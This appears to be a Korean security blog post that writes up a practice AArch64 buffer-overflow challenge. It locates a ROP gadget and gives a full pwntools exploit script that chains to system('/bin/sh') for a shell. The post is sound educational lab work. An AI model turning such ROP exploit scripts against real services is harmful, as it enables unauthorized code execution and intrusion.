@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[AArch64] Buffer OverFlow (실습) · whrds.log</title><meta name="description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ aarch64 기법 공부 중 대학 동기가 문제를 하나 만들어주었다. [Exploitable]이라는 이름의 Buffer OverFlow 문제이다. symbol이 지워져있다.. (아 귀찮... 그래도 static은 안걸려있으니까...) main()으로 ">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/aarch64-buffer-overflow-practice/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/aarch64-buffer-overflow-practice/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/aarch64-buffer-overflow-practice/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[AArch64] Buffer OverFlow (실습) · whrds.log"><meta property="og:description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ aarch64 기법 공부 중 대학 동기가 문제를 하나 만들어주었다. [Exploitable]이라는 이름의 Buffer OverFlow 문제이다. symbol이 지워져있다.. (아 귀찮... 그래도 static은 안걸려있으니까...) main()으로 "><meta property="og:url" content="https://whrds.github.io/ko/posts/aarch64-buffer-overflow-practice/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[AArch64] Buffer OverFlow (실습)","description":"※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ aarch64 기법 공부 중 대학 동기가 문제를 하나 만들어주었다. [Exploitable]이라는 이름의 Buffer OverFlow 문제이다. symbol이 지워져있다.. (아 귀찮... 그래도 static은 안걸려있으니까...) main()으로 ","datePublished":"2024-05-01","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/aarch64-buffer-overflow-practice/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/aarch64-buffer-overflow-practice/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[AArch64] Buffer OverFlow (실습)</h1><p class="article-description">※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ aarch64 기법 공부 중 대학 동기가 문제를 하나 만들어주었다. [Exploitable]이라는 이름의 Buffer OverFlow 문제이다. symbol이 지워져있다.. (아 귀찮... 그래도 static은 안걸려있으니까...) main()으로 </p><div class="article-meta"><time datetime="2024-05-01">2024년 5월 1일</time><span>·</span><span>1 분 읽기</span></div></header><div class="prose"><p><strong>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. <strong>※</strong></strong></p>
+<p>aarch64 기법 공부 중 대학 동기가 문제를 하나 만들어주었다.</p>
+<p>[Exploitable]이라는 이름의 Buffer OverFlow 문제이다.</p>
+<p><img src="/assets/images/tistory/tistory-e16623b654cb/001.png" alt=""></p>
+<p>symbol이 지워져있다… (아 귀찮… 그래도 static은 안걸려있으니까…)</p>
+<p><img src="/assets/images/tistory/tistory-e16623b654cb/002.png" alt=""></p>
+<p>main()으로 보이는 함수이다.</p>
+<p>별다른 취약점은 보이지 않는다.</p>
+<p><img src="/assets/images/tistory/tistory-e16623b654cb/003.png" alt=""></p>
+<p>호출되는 함수이다.</p>
+<p>구조는 매우 단순하다. 앞서 다뤘던 예제처럼 main()이 아닌 호출되는 함수쪽에서 bof취약점이 발생한다.</p>
+<p>하지만 바로 Shell을 얻거나 flag를 출력해주는 함수가 존재하지 않기 때문에 gadget들을 사용하여 chain을 구성해야 한다.</p>
+<pre><code>ROPgadget --binary Exploitable
+
+#0x0000000000400724 : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-e16623b654cb/004.png" alt=""></p>
+<p>맛있어 보이는 gadget이 존재한다.</p>
+<p>system(“/bin/sh”);를 구현한다고 가정했을 때, 첫번째 인자값은 x0레지스터로 전달해야한다.</p>
+<p>해당 gadget을 살펴보면 스택에 있는 값을 x0에 저장하는 과정이 있고 ldp 명령을 통해서 x29, x30을 덮어쓴다.</p>
+<p>이때 x30이 ret에 해당하므로 구현하고자 하는 명령을 구현할 수 있다.</p>
+<p>마침 해당 시나리오를 수행하라고 함수가 하나 만들어져 있다.</p>
+<p><img src="/assets/images/tistory/tistory-e16623b654cb/005.png" alt=""></p>
+<p>해당 함수로부터 system()의 주소를 가져오고 /bin/sh문자열을 넣어주면 끝나는 문제이다.</p>
+<pre><code>from pwn import *
+
+#p = process(['qemu-aarch64-static','./Exploitable'])
+p = process(['qemu-aarch64-static','-g','1234','./Exploitable'])
+e = ELF('./Exploitable')
+
+#ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
+gadget = 0x0000000000400724
+system = 0x0000000000400590
+binsh = 0x420040
+
+payload = b'a'*0x28
+payload += p64(gadget)
+payload += b'a'*0x10
+payload += p64(system)*2
+payload += p64(0x0)
+payload += p64(binsh)
+
+p.sendlineafter(b'...', payload)
+
+p.interactive()
+</code></pre>
+<p>위 방식대로 작성하면 shell을 얻을 수 있다.</p>
+<p>[</p>
+<p>Exploitable</p>
+<p>0.06MB</p>
+<p>](<a href="https://blog.kakaocdn.net/dna/bV6S14/btsG3tnmYfg/AAAAAAAAAAAAAAAAAAAAAI-s461KpxfspdkapSiGTS3atLDJ6NDOXd8oiTSqzxPr/Exploitable?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1790780399&amp;allow_ip=&amp;allow_referer=&amp;signature=aLIIripn%2FRu39F%2BDa4zAWFcuGZc%3D&amp;attach=1&amp;knm=tfile.dat">https://blog.kakaocdn.net/dna/bV6S14/btsG3tnmYfg/AAAAAAAAAAAAAAAAAAAAAI-s461KpxfspdkapSiGTS3atLDJ6NDOXd8oiTSqzxPr/Exploitable?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1790780399&amp;allow_ip=&amp;allow_referer=&amp;signature=aLIIripn%2FRu39F%2BDa4zAWFcuGZc%3D&amp;attach=1&amp;knm=tfile.dat</a>)</p>
+<p>공유 허락을 받고 파일을 올려드립니다.</p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/aarch64-buffer-overflow-practice/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
